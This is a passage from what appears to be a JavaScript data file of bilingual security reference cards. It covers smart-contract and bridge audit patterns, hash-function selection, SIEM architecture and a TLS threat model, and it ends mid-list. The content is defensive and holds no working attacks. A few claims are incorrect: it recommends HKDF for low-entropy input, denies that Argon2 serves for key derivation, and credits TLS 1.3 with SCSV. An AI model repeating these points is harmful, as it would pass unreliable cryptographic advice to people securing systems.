  <li><strong>Integer Overflow/Underflow.</strong> Solidity ≥0.8 reverted bei Overflow; Pre-0.8 nutzte SafeMath. Audit-Muster: explizite <code>unchecked { … }</code>-Blöcke müssen reviewed werden. Häufiger Bug: <code>unchecked</code> für Gas-Savings in Subtraktion ohne Bounds-Check.</li>
  <li><strong>Access-Control.</strong> Fehlendes <code>onlyOwner</code> auf privilegierter Funktion; <code>tx.origin</code> für Auth (via Zwischen-Contract umgehbar); Initializer zweimal aufrufbar; Role-Renounce-Pfade, die Contract bricken.</li>
  <li><strong>Oracle-Manipulation.</strong> Price-Feed = on-chain DEX-Spot-Price. Angreifer flash-loaned, swapped um Preis zu bewegen, ruft Liquidation. Mitigation: TWAP über &gt;30 Min; Chainlink-style Off-Chain-Aggregation; Circuit-Breaker auf Price-Delta.</li>
  <li><strong>Time-Dependence.</strong> <code>block.timestamp</code> Miner-manipulierbar um ~15 Sek. Nicht für Randomness oder enge Fenster-Vergleiche nutzen.</li>
  <li><strong>Gas-DoS.</strong> Unbounded Loop über User-kontrolliertes Array; <code>send</code> an Adresse, die mehr als 2300 Gas verbraucht. Mitigation: Iteration paginieren; Pull-Pattern.</li>
  <li><strong>Front-Running / MEV.</strong> Mempool-sichtbare Transaktionen mit höherem Gas kopiert, um Wert zu extrahieren. Mitigation: Commit-Reveal, Private-Mempool (Flashbots), Batch-Auktionen.</li>
  <li><strong>Signature-Replay.</strong> EIP-712-Signatur ohne chainId oder Nonce → cross-chain oder Session-Replay.</li>
</ul>

<h2>Bridge-Architektur — wo Verluste leben</h2>
<ul>
  <li><strong>Validator-Set-Integrität.</strong> Bridge-Security == Validator-Set. Ronin (2022, $625M) kompromittierte 5/9 Validator-Keys. Wormhole (2022, $326M) — Signature-Verification-Bypass. Audit: wie wird das Validator-Set rotiert? Key-Custody (HSM, Threshold)? Slashing bei Fehlverhalten?</li>
  <li><strong>Message-Replay.</strong> Withdrawal-Proof wiederverwendbar cross-chain oder zweimal auf gleicher Chain. Nomad (2022, $190M) — uninitialisierter Trusted Root, jede Message by-default valid.</li>
  <li><strong>Asset-Accounting-Reconciliation.</strong> Auf Chain A gelockt, auf Chain B gemintet. Drift = Solvency-Bug. Audit: Invariante <code>locked == minted</code> in jedem Block. Off-Chain-Monitor, der bei Drift feuert.</li>
  <li><strong>Upgradeability.</strong> Proxy-Upgrades durch Admin = unilateraler Rug-Risk. Audit: Timelock + Multisig + On-Chain-Visibility. Upgrade-Governance gegen tatsächlichen TVL vergleichen — TVL wächst in fast allen Projekten schneller als Governance-Reife.</li>
</ul>

<h2>Konsens-Layer-Threats</h2>
<ul>
  <li><strong>Long-Range-Angriff (PoS).</strong> Angreifer kauft alte Validator-Keys (wertlos nach Unstake), schreibt History aus Epoche um, in der er Stake hatte. Mitigation: Weak-Subjectivity-Checkpoints.</li>
  <li><strong>Nothing-at-Stake.</strong> Validator votet auf jeder Fork, weil keine Kosten. Mitigation: Slashing bei konfligierenden Votes.</li>
  <li><strong>MEV am Konsens.</strong> Proposer-Builder-Separation (PBS) versucht Proposer-Renten zu limitieren; Censorship und Inclusion-List-Debatten laufen.</li>
  <li><strong>51%-Angriff auf PoW.</strong> Genug Hash mieten → Reorg → Double-Spend. Auf kleinen Chains ökonomisch rational; Bitcoin-Gold, Ethereum-Classic Real-World-Beispiele.</li>
</ul>

<h2>Audit-Muster-Checkliste</h2>
<ol>
  <li>External-Calls + State-Mutations — Reentrancy-Review.</li>
  <li><code>unchecked</code>-Blöcke — Arithmetic-Review.</li>
  <li>Jede privilegierte Funktion — Access-Control-Review (wer kann aufrufen, revokebar, transferierbar).</li>
  <li>Price-Input-Source — TWAP oder Single-Block? Via Flash-Loan manipulierbar?</li>
  <li>Loops — von Konstante oder von User-Input bounded?</li>
  <li>Upgrade-Pfad — Admin-, Timelock-, Multisig-Konfiguration?</li>
  <li>Signature-Verifikation — chainId, Nonce, EIP-712-Struktur korrekt?</li>
  <li>Initialisierung — Initializer One-Shot? Constructor setzt allen State? Proxy-Implementation initialisiert?</li>
</ol>
<div class="rs-rule"><strong>Faustregel</strong>In Smart-Contract-Audits sind die teuersten Bugs nicht exotisch — es sind Access-Control, Oracle-Manipulation und Upgrade-Pfad-Fehler. 70% der Audit-Zeit auf die langweiligen Fragen verwenden: wer kann das aufrufen, was vertraut es, was passiert auf dem Unhappy-Path.</div>
`
    ),
    phases: []
  },
  {
    id: "cryptographic-hashing-reference",
    domain: "ai-emerging", tier: 3,
    title: T("Cryptographic Hashing — Reference", "Kryptografisches Hashing — Referenz"),
    blurb: T(
      "Practitioner-level hashing reference: when collision resistance matters, when length-extension bites, and what to pick today.",
      "Praxisnahe Hashing-Referenz: wann Kollisionsresistenz zählt, wann Length-Extension schadet, und was heute zu wählen ist."
    ),
    body: B(
      `
<h2>Use-case → choice</h2>
<ul>
  <li><strong>Password storage.</strong> Argon2id (preferred), bcrypt (acceptable), scrypt (acceptable). Never SHA-256/SHA-512 directly, never MD5. OWASP-recommended Argon2id params (2024): t=2, m=19 MiB, p=1 for interactive; t=3, m=64 MiB, p=4 for higher-stakes. Tune until a single hash takes ~100 ms on your hardware.</li>
  <li><strong>Generic content addressing.</strong> SHA-256. Fast enough, ubiquitous library support, no known practical break. BLAKE3 if performance matters more than ecosystem.</li>
  <li><strong>File-equality / dedup where attacker cannot supply files.</strong> BLAKE3 or xxHash. Massive throughput; collision resistance not required.</li>
  <li><strong>Authenticated message integrity.</strong> HMAC-SHA-256 if you must use a hash. Better: AEAD (AES-GCM, ChaCha20-Poly1305) which gives encryption + integrity together. Don't hand-roll MAC by concatenating key and message.</li>
  <li><strong>Digital signatures.</strong> SHA-256 with RSA-PSS or ECDSA P-256 or Ed25519. Avoid SHA-1, MD5 (no longer collision-resistant — chosen-prefix collisions demonstrated).</li>
  <li><strong>Key derivation from low-entropy input.</strong> HKDF (extract + expand) using SHA-256. Not bcrypt/Argon2 (those are for password verification, not key derivation).</li>
  <li><strong>Commitment schemes / Merkle trees.</strong> SHA-256 (Bitcoin) or BLAKE3 / Poseidon (zk-friendly).</li>
  <li><strong>Random ID generation.</strong> Don't hash, just use CSPRNG bytes encoded base32. 16 bytes = 128 bits = safe.</li>
</ul>

<h2>Length-extension attack</h2>
<ul>
  <li><strong>What it is.</strong> Given <code>H(key || message)</code> and length of <code>key</code>, attacker computes <code>H(key || message || padding || extra)</code> without knowing <code>key</code>.</li>
  <li><strong>Vulnerable.</strong> SHA-1, SHA-256, SHA-512 (any Merkle-Damgård construction).</li>
  <li><strong>Not vulnerable.</strong> SHA-3 (Keccak sponge), BLAKE2, BLAKE3, HMAC over any hash.</li>
  <li><strong>Fix.</strong> Use HMAC: <code>HMAC(key, message)</code>. Library will do it correctly. Or use AEAD.</li>
</ul>

<h2>Common mistakes</h2>
<ul>
  <li><strong>MD5 for "non-security" uses.</strong> Then someone uses the result for cache key, then for ETag, then for security boundary. Use BLAKE3 or SHA-256 instead — same convenience, no future foot-gun.</li>
  <li><strong>SHA-256 for password storage.</strong> GPU cracking: 10 GH/s. Argon2id: ~10 H/s/GB. 9 orders of magnitude difference.</li>
  <li><strong>Truncating a hash to "save space".</strong> 64-bit truncated SHA-256 has 32-bit collision resistance via birthday bound — practical to attack.</li>
  <li><strong>Salt reuse / no salt.</strong> Reused salt = rainbow-table attack. Per-user random salt always.</li>
  <li><strong>Comparison via <code>==</code> on hashes used for auth.</strong> Timing leak. Use constant-time compare (<code>crypto.timingSafeEqual</code>, <code>hmac.compare_digest</code>).</li>
  <li><strong>Custom MAC construction.</strong> "H(key || msg)" — vulnerable to length extension. "H(msg || key)" — collision on H lets you forge. Just use HMAC.</li>
</ul>

<h2>Migration paths</h2>
<ul>
  <li><strong>MD5 password hashes →.</strong> On next login, rehash with Argon2id and store. Old MD5 hash deletable after grace window where users have logged in.</li>
  <li><strong>SHA-1 signatures →.</strong> Re-sign with SHA-256. Verify both during transition; reject SHA-1 after cut-off.</li>
  <li><strong>HMAC-SHA-1 (e.g., legacy AWS Sig v2) →.</strong> HMAC-SHA-256 (Sig v4).</li>
  <li><strong>bcrypt approaching cost-factor ceiling →.</strong> Argon2id. Wrap during user login.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>For 99% of use-cases the decision tree is: passwords → Argon2id; integrity with key → HMAC-SHA-256 or AEAD; integrity without key → SHA-256 or BLAKE3; random IDs → CSPRNG, not a hash. Almost everything else is a custom mistake.</div>
`,
      `
<h2>Use-Case → Auswahl</h2>
<ul>
  <li><strong>Passwort-Storage.</strong> Argon2id (bevorzugt), bcrypt (akzeptabel), scrypt (akzeptabel). Niemals SHA-256/SHA-512 direkt, niemals MD5. OWASP-empfohlene Argon2id-Params (2024): t=2, m=19 MiB, p=1 für interaktiv; t=3, m=64 MiB, p=4 für höhere Stakes. Tunen bis ein Hash ~100 ms auf deiner Hardware dauert.</li>
  <li><strong>Generisches Content-Addressing.</strong> SHA-256. Schnell genug, allgegenwärtige Lib-Unterstützung, kein praktischer Break. BLAKE3 wenn Performance mehr zählt als Ökosystem.</li>
  <li><strong>File-Equality / Dedup wo Angreifer keine Files liefern kann.</strong> BLAKE3 oder xxHash. Massiver Durchsatz; Kollisionsresistenz nicht erforderlich.</li>
  <li><strong>Authentifizierte Message-Integrität.</strong> HMAC-SHA-256 wenn Hash sein muss. Besser: AEAD (AES-GCM, ChaCha20-Poly1305), gibt Encryption + Integrität zusammen. MAC nicht durch Konkatenation von Key und Message handrollen.</li>
  <li><strong>Digitale Signaturen.</strong> SHA-256 mit RSA-PSS oder ECDSA P-256 oder Ed25519. SHA-1, MD5 vermeiden (nicht mehr kollisionsresistent — Chosen-Prefix-Kollisionen demonstriert).</li>
  <li><strong>Key-Derivation aus Low-Entropy-Input.</strong> HKDF (Extract + Expand) mit SHA-256. Nicht bcrypt/Argon2 (die sind für Passwort-Verifikation, nicht Key-Derivation).</li>
  <li><strong>Commitment-Schemes / Merkle-Trees.</strong> SHA-256 (Bitcoin) oder BLAKE3 / Poseidon (zk-friendly).</li>
  <li><strong>Random-ID-Generierung.</strong> Nicht hashen, einfach CSPRNG-Bytes base32-kodiert. 16 Bytes = 128 Bit = sicher.</li>
</ul>

<h2>Length-Extension-Angriff</h2>
<ul>
  <li><strong>Was es ist.</strong> Gegeben <code>H(key || message)</code> und Länge von <code>key</code>, berechnet Angreifer <code>H(key || message || padding || extra)</code> ohne <code>key</code> zu kennen.</li>
  <li><strong>Vulnerable.</strong> SHA-1, SHA-256, SHA-512 (jede Merkle-Damgård-Konstruktion).</li>
  <li><strong>Nicht vulnerable.</strong> SHA-3 (Keccak-Sponge), BLAKE2, BLAKE3, HMAC über beliebigen Hash.</li>
  <li><strong>Fix.</strong> HMAC nutzen: <code>HMAC(key, message)</code>. Library macht es korrekt. Oder AEAD nutzen.</li>
</ul>

<h2>Häufige Fehler</h2>
<ul>
  <li><strong>MD5 für "Non-Security"-Uses.</strong> Dann nutzt jemand das Ergebnis als Cache-Key, dann als ETag, dann als Security-Boundary. BLAKE3 oder SHA-256 stattdessen — gleiche Bequemlichkeit, kein Future-Foot-Gun.</li>
  <li><strong>SHA-256 für Passwort-Storage.</strong> GPU-Cracking: 10 GH/s. Argon2id: ~10 H/s/GB. 9 Größenordnungen Unterschied.</li>
  <li><strong>Hash kürzen, um "Platz zu sparen".</strong> 64-Bit-truncated SHA-256 hat 32-Bit-Kollisionsresistenz via Birthday-Bound — praktisch angreifbar.</li>
  <li><strong>Salt-Reuse / kein Salt.</strong> Wiederverwendetes Salt = Rainbow-Table-Angriff. Pro-User-Random-Salt immer.</li>
  <li><strong>Vergleich via <code>==</code> auf Hashes für Auth.</strong> Timing-Leak. Constant-Time-Compare nutzen (<code>crypto.timingSafeEqual</code>, <code>hmac.compare_digest</code>).</li>
  <li><strong>Custom-MAC-Konstruktion.</strong> "H(key || msg)" — Length-Extension. "H(msg || key)" — Kollision auf H erlaubt Forgery. Einfach HMAC nutzen.</li>
</ul>

<h2>Migrationspfade</h2>
<ul>
  <li><strong>MD5-Passwort-Hashes →.</strong> Beim nächsten Login mit Argon2id rehashen und speichern. Alter MD5-Hash nach Grace-Window löschbar, in dem User sich eingeloggt haben.</li>
  <li><strong>SHA-1-Signaturen →.</strong> Mit SHA-256 neu signieren. Beide während Transition verifizieren; SHA-1 nach Cut-Off ablehnen.</li>
  <li><strong>HMAC-SHA-1 (z.B. Legacy AWS Sig v2) →.</strong> HMAC-SHA-256 (Sig v4).</li>
  <li><strong>bcrypt nähert sich Cost-Factor-Ceiling →.</strong> Argon2id. Beim User-Login wrappen.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Für 99% der Use-Cases ist der Entscheidungsbaum: Passwörter → Argon2id; Integrität mit Key → HMAC-SHA-256 oder AEAD; Integrität ohne Key → SHA-256 oder BLAKE3; Random-IDs → CSPRNG, kein Hash. Fast alles andere ist ein Custom-Fehler.</div>
`
    ),
    phases: []
  },

  // ─────────────────────────────────────────────────────────────
  // 08 — DEFENSIVE OPERATIONS & GOVERNANCE
  // ─────────────────────────────────────────────────────────────
  {
    id: "siem-architecture",
    domain: "defensive-ops", tier: 2,
    title: T("SIEM Architecture — Reference", "SIEM-Architektur — Referenz"),
    blurb: T(
      "Reference architecture for a working SIEM: ingestion, normalization, detection layer, response loop — with the cost and quality trade-offs at each junction.",
      "Referenzarchitektur eines funktionierenden SIEM: Ingestion, Normalisierung, Detektions-Layer, Response-Loop — mit den Kosten- und Qualitäts-Trade-offs an jeder Verzweigung."
    ),
    body: B(
      `
<h2>Ingestion layer</h2>
<ul>
  <li><strong>Source-tier prioritization.</strong>
    <ul>
      <li><strong>Tier 1, full retention (1 year+):</strong> identity (AD/Okta auth), endpoint EDR telemetry, cloud control-plane (CloudTrail, AzureActivityLog, GCP AuditLog), DNS, firewall flow.</li>
      <li><strong>Tier 2, hot 30 days + cold archive:</strong> web-proxy, network IDS, application audit.</li>
      <li><strong>Tier 3, sample or summarize:</strong> debug-level app logs, NetFlow at volume, syslog from systems without security relevance.</li>
    </ul>
  </li>
  <li><strong>Schema-on-write vs schema-on-read.</strong>
    <ul>
      <li>Schema-on-write (Splunk-classic, ES with mappings): faster query, expensive change, hard to evolve.</li>
      <li>Schema-on-read (Splunk SPL, ES Runtime, Snowflake on raw): cheap ingest, slower query, easier to evolve.</li>
      <li>Hybrid (most modern): land raw + extract critical fields at ingest; full schema available at query.</li>
    </ul>
  </li>
  <li><strong>Cost levers.</strong> Drop verbose-but-useless fields at ingest (chatty Windows event payloads). Per-source filter (don't ingest <code>4624</code> from low-value workstations at full volume). Hot/warm/cold tiering — query latency proportional to cost.</li>
</ul>

<h2>Normalization — where SIEMs succeed or fail</h2>
<ul>
  <li><strong>Canonical schema.</strong> ECS (Elastic Common Schema), OCSF (Open Cybersecurity Schema Framework), or a vendor's CIM (Splunk Common Information Model). Pick one and enforce.</li>
  <li><strong>Key normalized fields.</strong>
    <ul>
      <li><code>user.name</code> + <code>user.id</code> + <code>user.email</code> — consistent across sources.</li>
      <li><code>source.ip</code> / <code>destination.ip</code> — direction matters, set both sides correctly.</li>
      <li><code>event.action</code> + <code>event.outcome</code> — what happened, did it succeed.</li>
      <li><code>host.name</code> — same host means same hostname across endpoints, network logs, EDR.</li>
      <li><code>process.executable</code> + <code>process.command_line</code> + <code>process.parent.executable</code> — process-tree pivot.</li>
    </ul>
  </li>
  <li><strong>Anti-pattern.</strong> Each source has its own field names downstream; every rule has to write conditions per source. Result: rules don't get written, or get written for one source and decay for the rest.</li>
  <li><strong>Enrichment at normalization time.</strong> User → role/group (from IAM). IP → asset (from CMDB). Hostname → owner team. Without these, every rule has to lookup and most don't.</li>
</ul>

<h2>Detection layer</h2>
<ul>
  <li><strong>Rule-based (Sigma, native SPL/KQL).</strong> Highest precision when written from a real attack pattern (MITRE ATT&amp;CK technique). Sigma converted to SIEM-native query enables portability.</li>
  <li><strong>Statistical baselines.</strong> Volume per user per hour, byte count per host per day. Catches commodity attacks; high FP on legitimate change.</li>
  <li><strong>Behavioral / UEBA.</strong> Per-entity baseline, surface deviation as score. Hunt input, not blocking decision.</li>
  <li><strong>Sequence / correlation.</strong> Event A then event B within window. Most valuable, hardest to maintain (state explosion at scale). Use sparingly for known kill chains.</li>
  <li><strong>Threat-intel match.</strong> IP/domain/hash watch list. High FP on stale lists; tier by confidence and recency.</li>
</ul>

<h2>Response loop</h2>
<ol>
  <li><strong>Alert.</strong> Routed to SOAR / ticket system with normalized fields + recommended playbook.</li>
  <li><strong>Triage.</strong> Analyst confirms TP / FP / benign-but-unusual.</li>
  <li><strong>Playbook automation.</strong> Enrichment (user context, asset criticality, related alerts), containment options (disable user, isolate endpoint), evidence collection automated.</li>
  <li><strong>Decision.</strong> Analyst (or automated rule for high-confidence cases) executes containment / escalation.</li>
  <li><strong>Feedback.</strong> Disposition fed back to detection authors. FP rate per rule tracked. Noisy rules retired or tuned, not allowed to rot.</li>
</ol>

<h2>Cost analysis</h2>
<ul>
  <li><strong>Per-GB ingest vs per-GB stored.</strong> Vendor model determines optimization. Splunk → cut ingest. Sumo / DataDog → cut stored. Sentinel → table-tier choice.</li>
  <li><strong>Hot vs cold.</strong> Hot data costs N× cold. Searchable cold tier acceptable for after-the-fact investigation, not for live detection.</li>
  <li><strong>Long-tail rule maintenance.</strong> Each detection has carrying cost (FP-triage hours + rule-update hours per quarter). Retire detections whose carrying cost exceeds their value.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>If you can't write one detection rule that runs unchanged across firewall, DNS, EDR, and cloud-audit logs because the field names differ, your normalization layer isn't done. Fix that before adding sources or rules.</div>
`,
      `
<h2>Ingestion-Layer</h2>
<ul>
  <li><strong>Source-Tier-Priorisierung.</strong>
    <ul>
      <li><strong>Tier 1, volle Retention (1 Jahr+):</strong> Identity (AD/Okta-Auth), Endpoint-EDR-Telemetry, Cloud-Control-Plane (CloudTrail, AzureActivityLog, GCP AuditLog), DNS, Firewall-Flow.</li>
      <li><strong>Tier 2, hot 30 Tage + Cold-Archive:</strong> Web-Proxy, Network-IDS, Application-Audit.</li>
      <li><strong>Tier 3, sampeln oder summieren:</strong> Debug-Level-App-Logs, NetFlow im Volumen, Syslog von Systemen ohne Security-Relevanz.</li>
    </ul>
  </li>
  <li><strong>Schema-on-Write vs Schema-on-Read.</strong>
    <ul>
      <li>Schema-on-Write (Splunk-classic, ES mit Mappings): schnellere Query, teurer Change, schwer evolvierbar.</li>
      <li>Schema-on-Read (Splunk SPL, ES Runtime, Snowflake auf Raw): günstiger Ingest, langsamere Query, leichter evolvierbar.</li>
      <li>Hybrid (meiste moderne): Raw landen + kritische Felder beim Ingest extrahieren; volles Schema bei Query verfügbar.</li>
    </ul>
  </li>
  <li><strong>Kosten-Hebel.</strong> Verbose-aber-nutzlose Felder beim Ingest droppen (chatty Windows-Event-Payloads). Per-Source-Filter (kein <code>4624</code> von Low-Value-Workstations in voller Lautstärke). Hot/Warm/Cold-Tiering — Query-Latenz proportional zu Kosten.</li>
</ul>

<h2>Normalisierung — wo SIEMs gelingen oder scheitern</h2>
<ul>
  <li><strong>Canonical-Schema.</strong> ECS (Elastic Common Schema), OCSF (Open Cybersecurity Schema Framework) oder ein Vendor-CIM (Splunk Common Information Model). Eines wählen und erzwingen.</li>
  <li><strong>Schlüssel-normalisierte Felder.</strong>
    <ul>
      <li><code>user.name</code> + <code>user.id</code> + <code>user.email</code> — konsistent über Sources.</li>
      <li><code>source.ip</code> / <code>destination.ip</code> — Richtung zählt, beide Seiten korrekt setzen.</li>
      <li><code>event.action</code> + <code>event.outcome</code> — was passierte, war es erfolgreich.</li>
      <li><code>host.name</code> — gleicher Host heißt gleicher Hostname über Endpoints, Network-Logs, EDR.</li>
      <li><code>process.executable</code> + <code>process.command_line</code> + <code>process.parent.executable</code> — Process-Tree-Pivot.</li>
    </ul>
  </li>
  <li><strong>Anti-Pattern.</strong> Jede Source hat downstream eigene Feldnamen; jede Regel muss Conditions pro Source schreiben. Resultat: Regeln werden nicht geschrieben oder für eine Source und verrotten für den Rest.</li>
  <li><strong>Enrichment zur Normalisierungszeit.</strong> User → Role/Group (aus IAM). IP → Asset (aus CMDB). Hostname → Owner-Team. Ohne diese muss jede Regel lookupen, und die meisten tun's nicht.</li>
</ul>

<h2>Detektions-Layer</h2>
<ul>
  <li><strong>Rule-based (Sigma, native SPL/KQL).</strong> Höchste Präzision wenn aus realem Attack-Pattern geschrieben (MITRE ATT&amp;CK-Technique). Sigma in SIEM-Native-Query konvertiert ermöglicht Portabilität.</li>
  <li><strong>Statistische Baselines.</strong> Volume pro User pro Stunde, Byte-Count pro Host pro Tag. Fängt Commodity-Angriffe; hohe FP bei legitimen Changes.</li>
  <li><strong>Behavioral / UEBA.</strong> Per-Entity-Baseline, Deviation als Score. Hunt-Input, keine Blocking-Decision.</li>
  <li><strong>Sequence / Correlation.</strong> Event A dann Event B innerhalb Fenster. Am wertvollsten, am schwersten zu maintainen (State-Explosion im Maßstab). Sparsam für bekannte Kill-Chains.</li>
  <li><strong>Threat-Intel-Match.</strong> IP/Domain/Hash-Watchlist. Hohe FP bei veralteten Listen; nach Konfidenz und Recency tieren.</li>
</ul>

<h2>Response-Loop</h2>
<ol>
  <li><strong>Alert.</strong> An SOAR / Ticket-System geroutet mit normalisierten Feldern + empfohlenem Playbook.</li>
  <li><strong>Triage.</strong> Analyst bestätigt TP / FP / Benign-aber-Unusual.</li>
  <li><strong>Playbook-Automation.</strong> Enrichment (User-Kontext, Asset-Kritikalität, verwandte Alerts), Containment-Optionen (User disabeln, Endpoint isolieren), Evidence-Collection automatisiert.</li>
  <li><strong>Decision.</strong> Analyst (oder Auto-Rule bei High-Confidence) führt Containment / Eskalation aus.</li>
  <li><strong>Feedback.</strong> Disposition zurück zu Detection-Autoren. FP-Rate pro Rule getrackt. Lautstarke Rules retired oder getuned, nicht verrotten gelassen.</li>
</ol>

<h2>Kostenanalyse</h2>
<ul>
  <li><strong>Per-GB-Ingest vs Per-GB-Stored.</strong> Vendor-Modell bestimmt Optimierung. Splunk → Ingest cutten. Sumo / DataDog → Stored cutten. Sentinel → Table-Tier-Choice.</li>
  <li><strong>Hot vs Cold.</strong> Hot-Daten kosten N× Cold. Searchable Cold-Tier akzeptabel für After-the-Fact-Investigation, nicht für Live-Detection.</li>
  <li><strong>Long-Tail-Rule-Maintenance.</strong> Jede Detection hat Carrying-Cost (FP-Triage-Stunden + Rule-Update-Stunden pro Quartal). Detections retiren, deren Carrying-Cost ihren Wert übersteigt.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Wenn du nicht eine Detection-Regel schreiben kannst, die unverändert auf Firewall, DNS, EDR und Cloud-Audit-Logs läuft weil Feldnamen differieren, ist deine Normalisierungs-Schicht nicht fertig. Das fixen bevor Sources oder Rules hinzugefügt werden.</div>
`
    ),
    phases: ["report", "recon"]
  },
  {
    id: "ssl-tls-threat-model",
    domain: "defensive-ops", tier: 2,
    title: T("SSL/TLS Threat Model", "SSL/TLS-Bedrohungsmodell"),
    blurb: T(
      "TLS attack surface organized by ceremony stage: handshake, certificate path, cipher choice, record layer — with the deprecation and mitigation timeline.",
      "TLS-Angriffsfläche nach Ceremony-Stufe: Handshake, Zertifikatspfad, Cipher-Auswahl, Record-Layer — mit der Deprecation- und Mitigation-Timeline."
    ),
    body: B(
      `
<h2>Handshake stage</h2>
<ul>
  <li><strong>Version negotiation.</strong> TLS 1.0/1.1 deprecated (RFC 8996, 2021). TLS 1.2 still acceptable with restricted ciphers; TLS 1.3 preferred. SSLv2/v3 disabled everywhere.</li>
  <li><strong>Downgrade attacks.</strong>
    <ul>
      <li>POODLE (SSLv3 padding oracle) — kill SSLv3.</li>
      <li>Version-rollback in clients claiming TLS support — TLS 1.3 includes SCSV mechanism to detect.</li>
      <li>Client signal "I support up to X" — server must enforce X-or-higher.</li>
    </ul>
  </li>
  <li><strong>Cipher-suite selection.</strong>
    <ul>
      <li><strong>Deprecated:</strong> RC4 (RFC 7465), 3DES (Sweet32), CBC-mode with SHA1 MAC (Lucky 13, BEAST), export-grade RSA (FREAK, Logjam), static RSA key exchange (no forward secrecy).</li>
      <li><strong>Current safe (TLS 1.2):</strong> ECDHE-RSA / ECDHE-ECDSA with AES-GCM or ChaCha20-Poly1305 + SHA-256/SHA-384.</li>
      <li><strong>Current safe (TLS 1.3):</strong> TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256. All forward-secret by default.</li>
    </ul>
  </li>
  <li><strong>Renegotiation.</strong> Secure-renegotiation extension RFC 5746 required. Legacy servers without it = vulnerable to injection.</li>
</ul>

<h2>Certificate path / PKI</h2>
<ul>
  <li><strong>Trust store.</strong> OS bundle (Microsoft, Apple, Mozilla NSS). Custom enterprise CA appended carefully — over-broad trust = SSL inspection becomes lateral-movement channel if appliance compromised.</li>
  <li><strong>Chain construction.</strong> Server should send entire chain except root. Missing intermediate = client must fetch from AIA (slow, sometimes failing).</li>
  <li><strong>Validation strictness.</strong> Verify: chain to trusted root, validity dates, hostname match, key-usage extension, basic-constraints, name-constraints.</li>
  <li><strong>Revocation.</strong>
    <ul>
      <li>CRL: large, downloaded periodically, often soft-fail (treat unreachable as valid).</li>
      <li>OCSP: real-time, privacy leak (CA learns who you visit), often soft-fail.</li>
      <li>OCSP stapling: server includes CA-signed status in handshake. Closest to right answer.</li>
      <li>Short-lived certs (Let's Encrypt 90 days, eventually 6 days) make revocation less critical.</li>
    </ul>
  </li>
  <li><strong>Certificate Transparency.</strong> All public CA issuance logged to append-only Merkle trees. Monitor your domains via <code>crt.sh</code>, <code>certstream</code>, <code>Censys</code> for mis-issuance. Catches phishing certs and rogue CAs.</li>
  <li><strong>Pinning.</strong> HPKP deprecated (foot-gun). Use static pinning in mobile apps only. For web: rely on CT monitoring + short cert lifetimes.</li>
  <li><strong>HSTS.</strong> <code>Strict-Transport-Security: max-age=63072000; includeSubDomains; preload</code>. Preload list via <code>hstspreload.org</code> kills first-visit downgrade.</li>
</ul>

<h2>Historic attack timeline</h2>
<ul>
  <li><strong>BEAST (2011).</strong> CBC IV predictable in TLS 1.0. Counter: 1/n-1 split or TLS 1.1+.</li>
  <li><strong>CRIME (2012).</strong> TLS compression leaks via length. Counter: disable TLS-level compression.</li>
  <li><strong>BREACH (2013).</strong> HTTP-level compression leaks reflected secrets. Counter: don't compress + don't reflect.</li>
  <li><strong>Lucky 13 (2013).</strong> CBC MAC timing leak. Counter: AEAD ciphers.</li>
  <li><strong>POODLE (2014).</strong> SSLv3 padding oracle. Counter: kill SSLv3.</li>
  <li><strong>FREAK / Logjam (2015).</strong> Export-grade RSA / DH forced via downgrade. Counter: kill EXPORT ciphers, use ≥2048-bit DH or ECDHE.</li>
  <li><strong>DROWN (2016).</strong> SSLv2 on same key as TLS 1.2 server compromises both. Counter: kill SSLv2, separate keys.</li>
  <li><strong>Sweet32 (2016).</strong> 64-bit block cipher (3DES) collision attack on long-lived connection. Counter: AES.</li>
  <li><strong>ROBOT (2017).</strong> Bleichenbacher resurrected on misconfigured RSA-PKCS#1v1.5. Counter: prefer ECDHE; if RSA, vendor patches.</li>
</ul>

<h2>Current safe baseline</h2>
<ul>
  <li>TLS 1.3 with TLS 1.2 fallback (only for ancient client compatibility).</li>
  <li>Ciphers limited to AES-GCM, AES-CCM, ChaCha20-Poly1305.</li>
  <li>ECDHE (P-256 or X25519) for key agreement.</li>
  <li>Cert signed with ECDSA P-256 or RSA-2048 minimum.</li>
  <li>OCSP stapling on, HSTS on with long max-age + preload, CT monitoring on.</li>
  <li>Mozilla SSL Configuration Generator ("Modern" or "Intermediate") is the canonical recipe.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>For new deployments, TLS 1.3 only. For mixed-client environments, TLS 1.2 with the restricted cipher list. Audit quarterly with <code>testssl.sh</code>, <code>nmap --script ssl-enum-ciphers</code>, or Qualys SSL Labs.</div>
`,
      `
<h2>Handshake-Stufe</h2>
<ul>
  <li><strong>Versions-Verhandlung.</strong> TLS 1.0/1.1 deprecated (RFC 8996, 2021). TLS 1.2 noch akzeptabel mit eingeschränkten Ciphern; TLS 1.3 bevorzugt. SSLv2/v3 überall disabled.</li>
  <li><strong>Downgrade-Angriffe.</strong>
    <ul>
      <li>POODLE (SSLv3-Padding-Oracle) — SSLv3 killen.</li>
      <li>Versions-Rollback in Clients, die TLS-Support behaupten — TLS 1.3 enthält SCSV-Mechanismus zur Detektion.</li>
      <li>Client-Signal "Ich unterstütze bis X" — Server muss X-oder-höher erzwingen.</li>
    </ul>
  </li>
  <li><strong>Cipher-Suite-Auswahl.</strong>
    <ul>
      <li><strong>Deprecated:</strong> RC4 (RFC 7465), 3DES (Sweet32), CBC-Mode mit SHA1-MAC (Lucky 13, BEAST), Export-Grade-RSA (FREAK, Logjam), Static-RSA-Key-Exchange (keine Forward-Secrecy).</li>
      <li><strong>Aktuell sicher (TLS 1.2):</strong> ECDHE-RSA / ECDHE-ECDSA mit AES-GCM oder ChaCha20-Poly1305 + SHA-256/SHA-384.</li>
      <li><strong>Aktuell sicher (TLS 1.3):</strong> TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256. Alle by-default Forward-Secret.</li>
    </ul>
  </li>
  <li><strong>Renegotiation.</strong> Secure-Renegotiation-Extension RFC 5746 erforderlich. Legacy-Server ohne = anfällig für Injection.</li>
</ul>

<h2>Certificate-Path / PKI</h2>
<ul>
